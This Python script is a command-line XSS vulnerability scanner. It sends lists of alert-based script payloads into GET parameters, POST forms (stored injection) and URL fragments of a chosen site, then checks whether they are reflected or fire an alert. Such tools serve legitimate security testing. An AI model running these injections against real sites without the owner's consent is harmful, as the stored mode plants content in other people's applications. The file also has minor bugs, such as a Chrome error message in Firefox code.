import requests
import time
from selenium import webdriver
from selenium.webdriver.firefox.service import Service as FirefoxService
from webdriver_manager.firefox import GeckoDriverManager
from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertPresentException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import urllib.request

dom_payloads = [
    "<img src=x onerror=alert('DOM-XSS-1')>",
    "<iframe onload=alert('DOM-XSS-2')></iframe>"
]

server_payloads = [
    "<script>alert('XSS-1')</script>",
    "<img src=x onerror=alert('XSS-2')>",
    "<h1>Vulnerable</h1>",
    "<svg onmouseover=alert('XSS')>Hover me</svg>",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    "<sCrIpt>alert('XSS')</sCRipt>",
    f"<iframe src='javascript:alert('XSS')'></iframe>",
    "'-alert('XSS')-'"
]



def test_server_side_xss(base_url, params_list, mode):
    print(f"\n[*] started SERVER GET test with params: {', '.join(params_list)} на {base_url}\n")

    for param_to_inject in params_list:
        print(f"=========================================\n[*] Testing param: '{param_to_inject}'")

        for payload in server_payloads:
            print(f"--- Payload: {payload}")
            try:
                if mode == 1:
                    params_dict = {param_to_inject: payload}
                else:
                    params_dict = {p: "test" for p in params_list}
                    params_dict[param_to_inject] = payload

                response = requests.get(base_url, params=params_dict, timeout=10)
                print(f"URL: {response.url}")

                if response.status_code == 200 and payload in response.text:
                    print(f"[+] SUCCESS! Payload found in response (param '{param_to_inject}').\n")
                else:
                    print("[-] FAIL. Payload not found or sanitized.\n")
            except requests.exceptions.RequestException as e:
                print(f"[!] Connection error: {e}\n")


def test_dom_xss(base_url, param_name):
    print(f"\n[*] Starting DOM-testing of param '{param_name}' (via #) on {base_url}\n")

    try:
        driver = webdriver.Firefox(service=FirefoxService(GeckoDriverManager().install()))
    except Exception as e:
        print(f"[!] Failed to start WebDriver. Make sure Chrome and ChromeDriver are installed. Error: {e}")
        return

    for payload in dom_payloads:
        print(f"--- Payload: {payload}")

        encoded_payload = urllib.parse.quote(payload)

        target_url = f"{base_url}#{param_name}={encoded_payload}"
        print(f"URL: {target_url}")

        try:
            driver.get(target_url)
            driver.refresh()

            try:
                WebDriverWait(driver, 3).until(EC.alert_is_present())
                alert = driver.switch_to.alert
                alert_text = alert.text
                print(f"[+] SUCCESS! Found alert: '{alert_text}'\n")
                alert.accept()
                continue
            except NoAlertPresentException:
                pass

        except UnexpectedAlertPresentException:
            print("[+] SUCCESS! Unexpected alert found, which indicates a vulnerability.\n")
            try:
                driver.switch_to.alert.accept()
            except NoAlertPresentException:
                pass
        except Exception as e:
            print(f"[!] Error occurred while testing Selenium: {e}\n")

    driver.quit()

def test_stored_xss(session, injection_url, view_url, params_list):
    print(f"\n[*] Started SERVER POST test with params: {', '.join(params_list)}\n")
    print(f"    Injection URL (POST): {injection_url}")
    print(f"    Checking URL (GET): {view_url}\n")

    params_dict = {p: "test" for p in params_list}

    for param_to_attack in params_dict.keys():
        print(f"================ Testing parameter '{param_to_attack}'")
        for payload in server_payloads:
            print(f"--- Payload: {payload}")

            data_to_send = params_dict.copy()
            data_to_send[param_to_attack] = payload

            try:
                print(f"[*] Send a POST request to {injection_url}...")
                inject_response = session.post(injection_url, data=data_to_send, timeout=10)

                if inject_response.status_code in [200, 302]:
                    print("[+] The injection was successful (the server accepted the data).")
                else:
                    print(f"[!] The server responded to the injection with {inject_response.status_code}. Skip the check.")
                    continue

                time.sleep(1)

                print(f"[*] Send a GET request to {view_url} to check...")
                view_response = session.get(view_url, timeout=10)

                if payload in view_response.text:
                    print(f"[+] SUCCESS! Payload found on the view page")
                    print("[!] Potential Stored XSS vulnerability found!\n")
                else:
                    print("[-] FAIL. Payload not found on the view page.\n")

            except requests.exceptions.RequestException as e:
                print(f"[!] Connection error: {e}\n")

if __name__ == "__main__":
    print("""                                 __ __                   
                              \\/(_ (____ _ _.._ ._  _ ._ 
                              /\\__)__)_>(_(_|| || |(/_|  """)

    mode = input(
        "Select a mode:\n 1 - Server POST test (stored)\n 2 - Server multiple GET parameters ISOLATED test (reflected)\n 3 - Server multiple GET parameters test (e.g. /?par=1&par=2...) (reflected)\n 4 - DOM test (one parameter in a URL fragment, #)\n Your choice: ")

    base_url = input("Enter the base URL (without the ‘?’ and ‘#’. for POST test, add page in the end): ")
    if mode == '1':
        s = requests.Session()

        # --- IF LOGIN NEEDED ---
        # login_url = "http://test-site.com/login.php"
        # login_data = {"username": "my_user", "password": "my_password", "login": "Login"}
        # s.post(login_url, data=login_data)
        # print("[*] Trying to login...")

        params_str = input("Enter the parameter names separated by commas: ")
        params = [p.strip() for p in params_str.split(',')]
        test_stored_xss(
            session=s,
            injection_url=base_url,
            view_url=base_url,
            params_list=params
        )
    elif mode == '2':
        params_str = input("Enter the parameter names separated by commas: ")
        params = [p.strip() for p in params_str.split(',')]
        test_server_side_xss(base_url, params, 1)
    elif mode == '3':
        params_str = input("Enter the parameter names separated by commas: ")
        params = [p.strip() for p in params_str.split(',')]
        test_server_side_xss(base_url, params, 2)
    elif mode == '4':
        param = input("Enter the name of the parameter in the URL fragment: ")
        test_dom_xss(base_url, param)

    else:
        print("\n[!] Invalid mode. Restart the script.")

    print("[*] Testing completed.")